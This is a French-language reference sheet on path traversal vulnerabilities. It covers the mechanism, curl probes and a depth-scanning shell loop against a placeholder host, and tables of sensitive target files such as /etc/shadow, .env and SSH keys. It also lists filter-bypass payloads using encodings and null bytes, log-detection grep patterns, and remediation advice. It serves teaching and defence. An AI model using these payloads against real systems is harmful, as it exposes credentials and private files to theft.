# 📁 Vulnérabilité Web : Path Traversal (Directory Traversal)

## 1. Aperçu & Classification

- **OWASP Top 10 (2021) :** Classé sous `A03:2021 — Injection`.
- **Définition & Mécanisme :** Permet à un attaquant d'accéder à des fichiers arbitraires situés hors de la racine web (`document root`) en manipulant des variables de chemin non filtrées.
- **Impacts principaux :**
  - **Lecture arbitraire :** Code source, secrets d'application, identifiants back-end, fichiers système.
  - **Écriture arbitraire (dans certains cas) :** Altération de données, modification du comportement applicatif, voire Prise de Contrôle à Distance (RCE).
- **Prérequis :** Présence d'un paramètre utilisateur passé directement à une fonction d'E/S système sans assainissement.

!!! info "Terminologie"
    Les termes *Path Traversal* et *Directory Traversal* sont utilisés indifféremment dans la littérature de sécurité. Le terme *Local File Inclusion (LFI)* désigne un cas particulier où le chemin traversé est **inclus/exécuté** par l'application (PHP `include`, par exemple), et non simplement lu.

---

## 2. Mécanisme d'Exploitation & Exemple Concret

- **Cas d'usage applicatif classique :** Chargement dynamique d'images (`<img src="/loadImage?filename=218.png">`).
- **Mappage serveur :** `/var/www/images/2018.png`.
- **Payload d'injection :**

```http
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: insecure-website.com
```

- **Résolution du système :** `/var/www/images/../../../etc/passwd` → Récupération du fichier `/etc/passwd`.
- **Comportement des OS :**
  - **Linux :** Séparateur principal `/`.
  - **Windows :** Séparateurs `/` et `\` (backslash) tous deux valides.

!!! tip "Note sur le nombre de remontées"
    Remonter au-delà de la racine `/` ou `C:\` ne provoque pas d'erreur ; le chemin reste bloqué à la racine du système de fichiers. Un attaquant peut donc « sur-remonter » (`../` répété 8 à 12 fois) sans risque, pour s'assurer d'atteindre la racine quel que soit le niveau de profondeur réel de l'application.

---

## 3. Paramètres Suspects, Sondes & Commandes curl

- **Paramètres HTTP à surveiller :** `?file=`, `?page=`, `?include=`, `?template=`, `?path=`, `?doc=`, `?folder=`, `?download=`, `?lang=`, `?locale=`.

- **Exemples de commandes de test (via curl) :**

**Linux :**
```bash
curl "http://cible.com/page.php?file=../../../../etc/passwd"
```

**Windows :**
```bash
curl "http://cible.com/page.php?file=..\..\..\..\windows\win.ini"
```

!!! tip "Automatisation de la sonde"
    Pour une détection rapide, faire varier la profondeur de remontée dans une boucle shell :
    ```bash
    for i in 1 2 3 4 5 6 7 8; do
      curl -s "http://cible.com/page.php?file=$(printf '../%.0s' $(seq 1 $i))etc/passwd" | grep -q "root:" && echo "Profondeur $i : succès"
    done
    ```

---

## 4. Fichiers Cibles Sensibles (Chemins d'attaque)

### Linux

| Chemin | Intérêt |
|---|---|
| `/etc/passwd` | Liste des comptes utilisateurs |
| `/etc/shadow` | Hashs des mots de passe (nécessite privilèges élevés) |
| `/etc/issue` | Bannière de version de la distribution OS |
| `/etc/hosts` | Résolution réseau interne |
| `/proc/self/environ` | Variables d'environnement & tokens applicatifs |
| `/proc/self/cmdline` | Ligne de commande du processus courant |
| `/var/log/auth.log` | Journaux d'authentification |
| `/var/www/html/.env` | Secrets d'application (clés API, DB) |
| `~/.ssh/id_rsa` | Clé privée SSH (si accessible) |
| `/var/log/apache2/access.log` | Log Apache (vecteur de log poisoning → RCE) |

### Windows

| Chemin | Intérêt |
|---|---|
| `C:\Windows\win.ini` | Configuration système standard (fichier de test classique) |
| `C:\Windows\System32\drivers\etc\hosts` | Résolution réseau interne |
| `C:\inetpub\wwwroot\web.config` | Configuration IIS, secrets et chaînes de connexion |
| `C:\Windows\repair\SAM` | Base SAM de secours (hashs locaux) |
| `C:\Users\<user>\NTUSER.DAT` | Ruche de registre utilisateur |
| `C:\xampp\apache\logs\access.log` | Log Apache sous XAMPP |

---

## 5. Techniques Avancées de Contournement (Filter Bypasses)

### 5.1 Chemins absolus

Injection directe du chemin cible pour contourner la suppression simple des séquences relatives (`../`) :

```http
GET /loadImage?filename=/etc/passwd HTTP/1.1
```

### 5.2 Séquences imbriquées (suffixes absorbés)

Contourne les filtres naïfs et non récursifs du type `str_replace("../", "")` : la suppression d'une seule occurrence de `../` au milieu de la chaîne reconstitue la séquence traversale.

```text
....//....//etc/passwd
....\/\....\/
..././..././etc/passwd
```

### 5.3 Encodage URL standard

| Séquence source | Encodage URL |
|---|---|
| `../` | `%2e%2e%2f` |
| `..\` | `%2e%2e%5c` |
| `..%2f` (mixte) | `%2e%2e%2f` |

```http
GET /loadImage?filename=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
```

### 5.4 Double encodage URL (Bypass WAF / Reverse Proxy)

Efficace lorsqu'un reverse proxy / WAF décode une seule fois avant de transmettre la requête à l'application, qui effectue un second décodage.

| Séquence source | Double encodage |
|---|---|
| `../` | `%252e%252e%252f` |
| `..\` | `%252e%252e%255c` |

```bash
curl "http://cible.com/page.php?file=..%252f..%252f..%252fetc%252fpasswd"
```

### 5.5 Encodage Overlong UTF-8 & non standard

Exploite une mauvaise implémentation du décodage UTF-8 acceptant des représentations multi-octets invalides (« overlong ») de caractères ASCII.

| Séquence source | Overlong UTF-8 |
|---|---|
| `../` | `..%c0%af` ou `%c0%ae%c0%ae%c0%af` |
| `..\` | `..%c1%9c` ou `..%c0%5c` |

### 5.6 Encodage Unicode / IIS (16-bit)

Historiquement efficace contre certaines versions d'IIS traitant un encodage Unicode non standard.

| Séquence source | Encodage Unicode IIS |
|---|---|
| `../` | `..%u2215`, `..%u2200`, `..%u002f` ou `%u002e%u002e%u002f` |
| `..\` | `..%u2216` ou `..%u005c` |

### 5.7 Préfixe imposé (répertoire de base obligatoire)

Quand l'application concatène un répertoire fixe avant le paramètre utilisateur, l'injection se fait après ce préfixe :

```text
filename=/var/www/images/../../../etc/passwd
```

### 5.8 Suffixe imposé & Null Byte Injection (`%00`)

Contourne une extension forcée côté application (ex. `.png` ajouté systématiquement) :

```text
filename=../../../etc/passwd%00.png
```

!!! warning "Portée historique du Null Byte"
    Cette technique exploite la troncature de chaîne par les fonctions système en C (terminaison `\0`) : l'application ajoute `.png`, mais l'appel système s'arrête au byte nul et ignore le suffixe. **Corrigé en PHP ≥ 5.3.4** (et dans les runtimes modernes managés) — elle ne fonctionne quasiment plus que sur des stacks obsolètes ou des composants natifs non maintenus.

---

## 6. Détection Blue Team & Analyse de Logs

- **Analyse des journaux Nginx / Apache :**

```bash
grep -E "\.\./|%2e%2e|%252e%252e|/etc/passwd|/proc/self" /var/log/apache2/access.log
```

- **Signaux complémentaires à corréler :**
  - Requêtes avec paramètres de type `file=`, `path=`, `doc=` suivies de codes retour `200` anormaux (exfiltration réussie) ou `403/500` répétés (sondage en cours).
  - Présence de motifs `%00`, `%c0%af`, `%u002f` dans les logs d'accès.
  - User-Agents associés à des scanners automatisés (Burp Suite, DirBuster, ffuf) combinés à des payloads de traversal.

!!! tip "WAF / IDS"
    Un WAF correctement configuré doit normaliser (décoder récursivement) l'URL **avant** d'appliquer ses règles de détection, sous peine d'être contourné par un double encodage (cf. 5.4).

---

## 7. Rémediation & Sécurisation (Defense-in-Depth)

- **Prévention Primaire :** Éviter de transmettre des entrées utilisateur directes aux API du système de fichiers.
- **Liste Blanche (Whitelisting) :** Valider l'entrée par rapport à un ensemble restreint de noms autorisés, ou n'autoriser que les caractères alphanumériques (regex stricte type `^[a-zA-Z0-9_-]+\.(png|jpg|pdf)$`).
- **Canonisation & Normalisation de Chemin (Path Normalization) :**
  - Résoudre le chemin réel (ex : `realpath()` en PHP, `Path.getCanonicalPath()` / `Paths.get(...).normalize()` en Java, `os.path.realpath()` en Python).
  - Vérifier formellement que le chemin canonisé commence **strictement** par le répertoire de base autorisé (comparaison de préfixe post-canonisation, jamais avant).
- **Principe du Moindre Privilège :** Restreindre les autorisations de lecture du compte utilisateur sous lequel tourne le serveur web (ex : `www-data`, `IIS_IUSRS`), de sorte qu'un contournement résiduel n'expose que des fichiers non sensibles.

!!! warning "Piège classique de la canonisation"
    Ne jamais valider le chemin **avant** de le résoudre (`realpath`/`normalize`). La validation doit systématiquement porter sur le chemin **final et canonisé**, sinon les techniques de la section 5 (séquences imbriquées, encodages) contournent trivialement le contrôle.
